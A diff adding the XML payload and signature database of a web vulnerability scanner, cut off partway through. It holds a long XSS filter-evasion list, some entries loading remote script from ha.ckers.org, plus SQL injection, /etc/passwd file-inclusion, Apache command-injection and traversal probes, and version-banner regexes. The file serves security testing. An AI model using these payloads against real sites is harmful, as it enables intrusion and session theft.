@@ -1,0 +1,732 @@
+<altair-kb>
+	<item name="Cross Site Scriptings" severity="medium" id="xss">
+		<description>A cross site scripting vulnerability, also known as XSS, is one of the most common vulnerabilities in web apps. The server does not check the users' input, and parses GET variables (can be done also through POST sometimes), without sanitizing them ahead of time. This allows users to inject html, javascript, or other code, through the page affected by this kind of bug. These injections occur client side (the server side code will be not modified), but the html stream that the user receives will contain the injected code . Usually this type of flaw is used to obtain private data such as cookies, data that often contains the credentials to access protected pages.</description>
+		<payload scope="*"><![CDATA["><sCrIpT>alert(document.cookie);</sCrIpT>]]></payload>
+		<!-- basic xss -->
+		<payload scope="*"><![CDATA[<SCRIPT>alert('XSS');</SCRIPT>]]></payload>	
+		<!-- XSS locator. If you don't have much space and know there is no vulnerable JavaScript on the page, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS verses <;XSS to see if it is vulnerable:-->
+		<payload scope="*"><![CDATA['';!--"<XSS>=&{()}]]></payload>
+		<!-- No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):-->
+		<payload scope="*"><![CDATA[<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>]]></payload>
+		<!-- Image XSS using the JavaScript directive:-->
+		<payload scope="*"><![CDATA[<IMG SRC="javascript:alert('XSS');">]]></payload>
+		<!-- No quotes and no semicolon: -->
+		<payload scope="*"><![CDATA[<IMG SRC=javascript:alert('XSS')>]]></payload>
+		<!-- Case insensitive XSS attack vector: -->
+		<payload scope="*"><![CDATA[<IMG SRC=JaVaScRiPt:alert('XSS')>]]></payload>
+		<!-- HTML entities (the semicolons are required for this to work): -->
+		<payload scope="*"><![CDATA[<IMG SRC=javascript:alert(&quot;XSS&quot;)>]]></payload>
+		<!-- Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents): -->
+		<payload scope="*"><![CDATA[<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>]]></payload>
+		<!-- fromCharCode (if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need): -->
+		<payload scope="*"><![CDATA[<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>]]></payload>
+		<!-- UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.0+ on untrusted settings). Use the XSS calculator for more information: -->
+		<payload scope="*"><![CDATA[SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></payload>
+		<!-- Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for "&#XX;", since most people don't know about padding - up to 7 numeric characters total). This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild): -->
+		<payload scope="*"><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></payload>
+		<!-- Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters). Use the XSS calculator for more information: -->
+		<payload scope="*"><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></payload>
+		<!-- Embedded tab to break up the cross site scripting attack: -->
+		<payload scope="*"><![CDATA[<IMG SRC="jav	ascript:alert('XSS');">]]></payload>
+		<!-- Embedded encoded tab to break up XSS. For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below: -->
+		<payload scope="*"><![CDATA[<IMG SRC="jav&#x09;ascript:alert('XSS');">]]></payload>
+		<!-- Embeded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector: -->
+		<payload scope="*"><![CDATA[<IMG SRC="jav&#x0A;ascript:alert('XSS');">]]></payload>
+		<!-- Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.): -->
+		<payload scope="*"><![CDATA[<IMG SRC="jav&#x0D;ascript:alert('XSS');">]]></payload>
+		<!-- Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector) these are not spaces just one of the three characters as described above: -->
+		<payload scope="*"><![CDATA[<IMG
+    SRC
+    =
+    "
+    j
+    a
+    v
+    a
+    s
+    c
+    r
+    i
+    p
+    t
+    :
+    a
+    l
+    e
+    r
+    t
+    (
+    '
+    X
+    S
+    S
+    '
+    )
+    "
+    >
+    ]]></payload>
+		<!-- Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword. The actual reality is you can have any char from 1-32 in decimal): -->
+		<payload scope="*"><![CDATA[<IMG SRC=" &#14;  javascript:alert('XSS');">]]></payload>
+		<!-- Non-alpha-non-digit XSS. While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example "<SCRIPT\s" != "<SCRIPT/XSS\s": -->
+		<payload scope="*"><![CDATA[<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>]]></payload>
+		<!-- No closing script tags. In Firefox and Netscape 8.0 on untrusted settings you don't actually need the "></SCRIPT>" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected: -->
+		<payload scope="*"><![CDATA[<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>]]></payload>
+		<!-- Half open HTML/JavaScript XSS vector. Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close ">" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn't require the end ">". As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag: -->
+		<payload scope="*"><![CDATA[<IMG SRC="javascript:alert('XSS')"]]></payload>
+		<!-- XSS with no single quotes or double quotes or semicolons: -->
+		<payload scope="*"><![CDATA[<SCRIPT>a=/XSS/
+		alert(a.source)</SCRIPT>]]></payload>
+		<!-- Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a="$ENV{QUERY_STRING}";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read <SCRIPT>var a="\\";alert('XSS');//";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.: -->
+		<payload scope="*"><![CDATA[\";alert('XSS');//]]></payload>
+		<!-- INPUT image: -->
+		<payload scope="*"><![CDATA[<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">]]></payload>
+		<!-- BODY image: -->
+		<payload scope="*"><![CDATA[<BODY BACKGROUND="javascript:alert('XSS')">]]></payload>
+		<!-- BODY tag (I like this method because it doesn't require using any variants of "javascript:" or "<SCRIPT..." to accomplish the XSS attack): -->
+		<payload scope="*"><![CDATA[<BODY ONLOAD=alert('XSS')>]]></payload>
+		<!-- IMG Dynsrc: -->
+		<payload scope="*"><![CDATA[<IMG DYNSRC="javascript:alert('XSS')">]]></payload>
+		<!-- IMG lowsrc: -->
+		<payload scope="*"><![CDATA[<IMG LOWSRC="javascript:alert('XSS')">]]></payload>
+		<!-- BGSOUND: -->
+		<payload scope="*"><![CDATA[<BGSOUND SRC="javascript:alert('XSS');">]]></payload>
+		<!-- & JavaScript includes (works in Netscape 4.x): -->
+		<payload scope="*"><![CDATA[<BR SIZE="&{alert('XSS')}">]]></payload>
+		<!-- Layer (also only works in Netscape 4.x) -->
+		<payload scope="*"><![CDATA[<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>]]></payload>
+		<!-- Style sheet: -->
+		<payload scope="*"><![CDATA[<LINK REL="stylesheet" HREF="javascript:alert('XSS');">]]></payload>
+		<!-- Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question can be redefined using an embedded expression.) This only works in IE and Netscape 8.0+ on trusted site settings. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page: -->
+		<payload scope="*"><![CDATA[<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">]]></payload>
+		<!-- Remote style sheet part 2 (this works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop: -->
+		<payload scope="*"><![CDATA[<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>]]></payload>
+		<!-- Remote style sheet part 3. This only works in Opera but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://ha.ckers.org/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox: -->
+		<payload scope="*"><![CDATA[<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">]]></payload>
+		<!-- Remote style sheet part 4. This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites: -->
+		<payload scope="*"><![CDATA[<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>]]></payload>
+		<!-- VBscript in an image: -->
+		<payload scope="*"><![CDATA[<IMG SRC='vbscript:msgbox("XSS")'>]]></payload>
+		<!-- Mocha (older versions of Netscape only): -->
+		<payload scope="*"><![CDATA[<IMG SRC="mocha:[code]">]]></payload>
+		<!-- Livescript (older versions of Netscape only): -->
+		<payload scope="*"><![CDATA[<IMG SRC="livescript:[code]">]]></payload>
+		<!-- Meta (the odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs): -->
+		<payload scope="*"><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">]]></payload>
+		<!-- Meta using data: URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details: -->
+		<payload scope="*"><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">]]></payload>
+		<!-- Meta using link header tag (which is not technically supported by HTTP1.1): -->
+		<payload scope="*"><![CDATA[<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">]]></payload>
+		<!-- Meta with additional URL parameter. If the target website attempts to see if the URL contains an http you can evade it with the following technique (Submitted by Moritz Naumann): -->
+		<payload scope="*"><![CDATA[<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">]]></payload>
+		<!-- Iframe (if iframes are allowed there are a lot of other XSS problems as well): -->
+		<payload scope="*"><![CDATA[<IFRAME SRC="javascript:alert('XSS');"></IFRAME>]]></payload>
+		<!-- Frame (frames have the same sorts of XSS problems as iframes): -->
+		<payload scope="*"><![CDATA[<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>]]></payload>
+		<!-- Tables (who would have thought tables were XSS targets... except me, of course): -->
+		<payload scope="*"><![CDATA[<TABLE BACKGROUND="javascript:alert('XSS')">]]></payload>
+		<!-- Div background-image: -->
+		<payload scope="*"><![CDATA[<DIV STYLE="background-image: url(javascript:alert('XSS'))">]]></payload>
+		<!-- Div background-image plus extra characters. I built a quick XSS fuzzer to detect Microsoft VBScript runtimeany erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.0 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279): -->
+		<payload scope="*"><![CDATA[<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">]]></payload>
+		<!-- Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression": -->
+		<payload scope="*"><![CDATA[<DIV STYLE="width: expression(alert('XSS'));">]]></payload>
+		<!-- STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts): -->
+		<payload scope="*"><![CDATA[<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>]]></payload>
+		<!-- STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov for this one): -->
+		<payload scope="*"><![CDATA[<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">]]></payload>
+		<!-- Anonymous HTML with STYLE attribute (IE and Netscape 8.0+ on trusted site settings don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter): -->
+		<payload scope="*"><![CDATA[<XSS STYLE="xss:expression(alert('XSS'))">]]></payload>
+		<!-- IMG STYLE with expression (this is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop): -->
+		<payload scope="*"><![CDATA[exp/*<XSS STYLE='no\xss:noxss("*//*");
+		xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>]]></payload>
+		<!-- STYLE tag (Older versions of Netscape only): -->
+		<payload scope="*"><![CDATA[<STYLE TYPE="text/javascript">alert('XSS');</STYLE>]]></payload>
+		<!-- STYLE tag using background-image: -->
+		<payload scope="*"><![CDATA[<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>]]></payload>
+		<!-- STYLE tag using background: -->
+		<payload scope="*"><![CDATA[<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>]]></payload>
+		<!-- Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.0 on trusted site settings). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector: -->
+		<payload scope="*"><![CDATA[<!--[if gte IE 4]>
+		<SCRIPT>alert('XSS');</SCRIPT>
+		<![endif]-->]]></payload>
+		<!-- BASE tag. Works in IE and Netscape 8.0 in safe mode. You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like "images/image.jpg" rather than full paths. If the path includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as long as there are two to begin the comment this will work): -->
+		<payload scope="*"><![CDATA[<BASE HREF="javascript:alert('XSS');//">]]></payload>
+		<!-- OBJECT tag (if they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS: -->
+		<payload scope="*"><![CDATA[<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>]]></payload>
+		<!-- Using an OBJECT tag you can embed XSS directly (this is unverified so no browser support is added): -->
+		<payload scope="*"><![CDATA[<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>]]></payload>
+		<!-- Using an OBJECT tag you can embed a flash movie that contains XSS: -->
+		<payload scope="*"><![CDATA[getURL("javascript:alert('XSS')")]]></payload>
+
+		<match type="simple">@PAYLOAD</match>
+	</item>
+	
+	<item name="SQL Injections" severity="high" id="sqli">
+		<description>An SQL injection, or SQL code injection, is another example of how a lack of checking user inputed data can undermine our site's security. Nowadays 90% of existing websites rely on a database to store contents such as news, articles, or simply to manage the users; this means that if not placed through an accurate checking process, the data send from an attacker can affect the information present in our database. An SQL injection, as the name itself suggests, is made by injecting arbitrary sql code in a variable sent to the website, both GET or POST, to obtain data from the db, data that would not be normally accessible .</description>
+		<payload scope="*">'</payload>
+		<payload scope="*">"</payload>
+		<payload scope="*">%27</payload>
+		<payload scope="*">%2527</payload>
+		<payload scope="*">&quot;</payload>
+		<payload scope="*">%00'</payload>
+		<payload scope="*">'&quot;</payload>
+		<payload scope="*">\'</payload>
+		<payload scope="*">\&quot;</payload>
+		<match type="simple">Microsoft OLE DB Provider for ODBC Drivers</match>
+		<match type="simple">Microsoft OLE DB Provider for SQL Server</match>
+		<match type="simple">Microsoft JET Database Engine</match>
+		<match type="simple">Microsoft SQL Native Client</match>
+		<match type="simple">ODBC Microsoft Access Driver</match>
+		<match type="simple">ODBC SQL Server Driver</match>
+		<match type="simple">supplied argument is not a valid MySQL result</match>
+		<match type="simple">Invalid parameter type</match>
+		<match type="simple">You have an error in your SQL syntax</match>
+		<match type="simple">Incorrect column name</match>
+		<match type="simple">Can't find record in</match>
+		<match type="simple">Unknown table</match>
+		<match type="simple">Incorrect column specifier for column</match>
+		<match type="simple">Column count doesn't match value count at row</match>
+		<match type="simple">Unclosed quotation mark before the character string</match>
+		<match type="simple">Invalid SQL:</match>
+		<match type="simple">ERROR: parser: parse error at or near</match>
+		<match type="simple">java.lang.NumberFormatException: For input string:</match>
+		<match type="simple">): encountered SQLException [</match>
+		<match type="simple">Unexpected end of command in statement [</match>
+		<match type="regex">(?i)(Line\s\d+:\sIncorrect\ssyntax\snear\s'[^']*')</match>
+		<match type="regex">(?i)(pg_query\(\)[:]*\squery\sfailed:\serror:\s)</match>
+		<match type="regex">(?i)(Microsoft\sJScript\sruntime.*error\s'[^']*')</match>
+		<match type="regex">(?i)('[^']*'\sis\snull\sor\snot\san\sobject)</match>
+		<match type="regex"><![CDATA[Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<;br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<;br><;b>.*,\sline\s\d+<;/b><;br>]]></match>
+		<match type="regex"><![CDATA[Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*]]></match>
+		<match type="regex"><![CDATA[Syntax\serror\s.*in\squery\sexpression\s'(.+)\.]]></match>
+		<match type="regex">ORA-\d{4,5}:\s</match>
+	</item>
+	
+	<item name="Remote File Inclusions" severity="high" id="rfi">
+		<description>A remote file inclusion happens when a page includes a file whose name is taken from a GET or POST variable that is not sanitized or checked ahead of time .</description>
+
+		<payload scope="*">@RANDOM</payload>	
+		<payload scope="*">/@RANDOM</payload>	
+		<payload scope="*">../@RANDOM</payload>	
+		<match type="simple">Failed opening required '@RANDOM'</match>
+		<match type="simple">Failed opening '@RANDOM'</match>
+	</item>
+	
+	<item name="Local File Inclusions" severity="high" id="lfi">
+		<description>A local file inclusion happens when a page includes a file whose name is taken from a GET or POST variable that is not sanitized or checked ahead of time .</description>
+		
+		<payload scope="*">@RANDOM</payload>	
+		<payload scope="*">/@RANDOM</payload>	
+		<payload scope="*">../@RANDOM</payload>	
+		<payload scope="*">/etc/passwd%00</payload>
+
+		<match type="simple">failed to open stream: No such file or directory in</match>
+		<match type="simple">Microsoft VBScript runtime</match>
+		<match type="simple">fopen() [<a href='function.fopen'>function.fopen</a>]: Unable to access</match>
+		<match type="simple">/usr/sbin:</match>
+	</item>
+	
+	<item name="Apache Win32 Batch File Remote Command Execution" severity="high">
+		<description>This version of the Apache web server allows a remote attacker to execute an arbitrary command on the server .</description>
+		<payload scope="HTTP">/cgi-bin/test-cgi.bat?|dir</payload>
+	</item>
+
+	<item name="Apache Win32 File Reading" severity="high">
+		<description>This version of the Apache web server allows a remote attacker to read an arbitrary file on the server .</description>
+		<payload scope="HTTP"><![CDATA[/<<<<<<<<<<<<]]></payload>
+	</item>
+	
+	<item name="Apache Win32 Directory Traversal" severity="high">
+		<description>This version of the Apache web server allows a remote attacker to read an arbitrary file on the server traversing its directory tree .</description>
+		<payload scope="HTTP">/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini</payload>
+	</item>
+
+	<item name="Evilsentinel Installation" severity="very low">
+		<description>An evilsentinel security system installation were found on this site, scan results could be empty :D .</description>
+		<payload scope="HTTP">/evilsentinel/about.php</payload>
+	</item>
+	
+	<item name="Buffer Overflows in Legacy mod_jk2" severity="high">
+		<description>
+			mod_jk2 versions prior to 2.0.4 are vulnerable to multiple stack
+			overflow vulnerabilities. Specifically, IOActive has discovered multiple
+			locations where these vulnerabilities are exploitable via the Host
+			request header in any given request. These overflows all result in
+			remote code execution under the user of the running Apache process.
+			Although a legacy module which is end of life, certain vendors may use
+			this module in their products rendering them vulnerable to remote
+			exploitation .
+		</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">mod_jk2</match>
+	</item>
+	
+	<item name="Apache OpenSSL Remote Exploit" severity="high">
+		<description>openssl-too-open is a remote exploit for the KEY_ARG overflow in OpenSSL 0.9.6d and older. Tested against most major Linux distributions. Gives a remote nobody shell on Apache and remote root on other servers. Includes an OpenSSL vulnerability scanner and a detailed vulnerability analysis. Only Linux/x86 targets are supported.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">pache-1.3</match>
+		<match type="simple">pache_1.3</match>
+		<match type="simple">pache/1.3</match>
+		<match type="simple">pache 1.3</match>
+		<match type="simple">pache_fp-1.3</match>
+	</item>
+
+	<item name="Apache 2.x Memory Leak Exploit" severity="medium">
+		<description>
+			Remote exploitation of a memory leak in the Apache HTTP Server causes the
+			daemon to over utilize system resources on an affected system. The problem
+			is HTTP Server's handling of large chunks of consecutive linefeed
+			characters. The web server allocates an eighty-byte buffer for each
+			linefeed character without specifying an upper limit for allocation.
+			Consequently, an attacker can remotely exhaust system resources by
+			generating many requests containing these characters.
+		</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">pache 2</match>
+	</item>
+
+	<item name="Apache APR Exploit" severity="high">
+		<description>Multiple Apache 2.0.x modules exploit .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">pache 2.0.3</match>
+		<match type="simple">pache-2.0.3</match>
+		<match type="simple">pache/2.0.3</match>
+		<match type="simple">pache 2.0.4</match>
+		<match type="simple">pache-2.0.4</match>
+		<match type="simple">pache/2.0.4</match>
+	</item>
+
+	<item name="Apache mod_mylo Remote Code Execution" severity="high">
+		<description>Apache 1.3 mod_mylo allows a user to execute remote arbitrary code .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">pache 1.3</match>
+		<match type="simple">pache-1.3</match>
+		<match type="simple">pache/1.3</match>
+	</item>
+
+	<item name="Apache mod_gzip Remote Exploit" severity="high">
+		<description>Apache 1.2 mod_gzip allows a user to gain remote root access to the server .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">pache 1.2</match>
+		<match type="simple">pache-1.2</match>
+		<match type="simple">pache/1.2</match>
+	</item>
+	
+	<item name="4D WebSTAR Multiple Flaws" severity="high">
+		<description>This version of 4D WebSTAR may be vulnerable to multiple flaws. http://secunia.com/advisories/12063/ .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">4D_WebSTAR_S\/5\.([0-2]|3\.[0-2])</match>
+	</item>
+
+	<item name="4D WebSTAR Denial Of Service" severity="high">
+		<description>This version of 4D WebSTAR may be vulnerable to denial of service threw openssl implementation bug. http://secunia.com/advisories/11181/ .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">4D_WebSTAR_S\/5\.([0-2]|3\.[01])</match>
+	</item>
+	
+	<item name="4D WebSTAR Buffer Overflow" severity="high">
+		<description>This version of 4D WebSTAR may be vulnerable to a buffer overflow in tomcat plugin URL. http://secunia.com/advisories/15278/ .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">4D_WebSTAR_S\/5\.([0-3]|4[^.])</match>
+	</item>	
+	
+	<item name="4D WebSTAR 5.3.1 Buffer Overflow" severity="high">
+		<description>This version of 4D WebSTAR may be vulnerable to remote exploitable buffer overflow. http://secunia.com/advisories/9723/ .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">4D_WebSTAR_S\/5\.3\.1</match>
+	</item>	
+	
+	<item name="Abyss 1.0.3 Directory Traversal" severity="high">
+		<description>This version of Abyss may be vulnerable to directory traversal by using '%5c%2e%2e%5c' type paths .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Abyss\/1\.0\.3</match>
+	</item>	
+	
+		<item name="Tivoli Server Administration" severity="high">
+		<description>May be Tivoli server administration. Default account is admin/admin.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">ADSM_HTTP\/</match>
+	</item>
+
+	<item name="Java Embededd Device Class" severity="medium">
+		<description>Java class Acme.Serve.Serve is used as an embedded server for many devices</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Acme\.Serve\/v1\.7 of 13nov96</match>
+	</item>
+
+	<item name="Agranat Printer" severity="low">
+		<description>Most likely a printer .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Agranat\-EMWeb</match>
+	</item>
+
+	<item name="Allegro Software Printer" severity="low">
+		<description>Most likely a printer .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Allegro\-Software\-RomPager</match>
+	</item>
+
+	<item name="Apache Tomcat Source Code Exposure" severity="high">
+		<description>May be vulnerable to JSP source code exposure. CAN-2002-1148.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache Tomcat\/4\.(0\.[1-4]|1\.[0-9][^0-9]|1\.10)</match>
+	</item>
+
+	<item name="Apache Tomcat 4.0.3 Win 2000 Denial Of Service" severity="high">
+		<description>Apache Tomcat 4.0.3 Win 2000 server is vulnerable to a DoS attack. Upgrade to a 4.1.3beta or higher.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache Tomcat\/4\.0\.3</match>
+	</item>
+
+	<item name="Apache-SSl Buffer Overflow" severity="high">
+		<description>This version of Apache-SSl is vulnerable to a buffer overflow.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/.* Ben-SSL\/1\.([0-9][^0-9]|[0-3][0-9]|4[0-6])[^0-9]</match>
+	</item>
+
+	<item name="Apache 1.x Denial Of Service And Code Execution" severity="high">
+		<description>Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/(1\.2\.([2-9].*|1[0-9])|1\.3\.([0-1].*|2[0-4]))</match>
+	</item>
+
+	<item name="Apache 1.1.1 Directory Exposure" severity="medium">
+		<description>May be able view directory contents regardless of index.html</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/1\.1\.1</match>
+	</item>
+
+	<item name="Apache 1.1.3 mod_cookies Buffer Overflow" severity="high">
+		<description>This version has a mod_cookies buffer overflow .</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/1\.1\.3</match>
+	</item>
+
+	<item name="Apache 1.3.x Local Buffer Overflow" severity="high">
+		<description>Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/1\.3\.(0.*|1.*|2[0-6])</match>
+	</item>
+	
+	<item name="Apache 1.3.x mod_rewrite And mod_cgi Flaws" severity="high">
+		<description>Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/1\.3\.(0.*|1.*|2[0-8])</match>
+	</item>
+
+	<item name="Apache 1.3.27 Win32 And OS/2 Remote Exploits" severity="high">
+		<description>Windows and OS/2 version vulnerable to remote exploit. CAN-2003-0460</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/1\.3\.27</match>
+	</item>
+	
+	<item name="Apache 2.0.x Win32 Arbitrary File Retrieval" severity="high">
+		<description>Apache 2.0 to 2.0.39 Windows may be vulnerable to arbitrary file retrieval. CAN-2002-0661.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-2].*|3.*)</match>
+	</item>
+
+	<item name="Apache 2.0.x Denial Of Service And Code Execution" severity="high">
+		<description>Apache 2.0 up 2.0.36 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-2].*|3[0-8])</match>
+	</item>
+
+	<item name="Apache 2.0.x mod_alias And mod_rewrite Buffer Overflow" severity="high">
+		<description>Apache 2.0 to 2.0.48: overflows in mod_alias and mod_rewrite (OSVDB-2733</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-3].*|4.[0-8])</match>
+	</item>
+	
+	<item name="Apache 2.0.x Multiple Remote Flaws" severity="high">
+		<description>Apache 2.0 up 2.0.46 are vulnerable to multiple remote problems. CAN-2003-0192. CAN-2003-0253. CAN-2003-0254. CERT VU#379828.</description>
+		<payload scope="HEADER">/</payload>
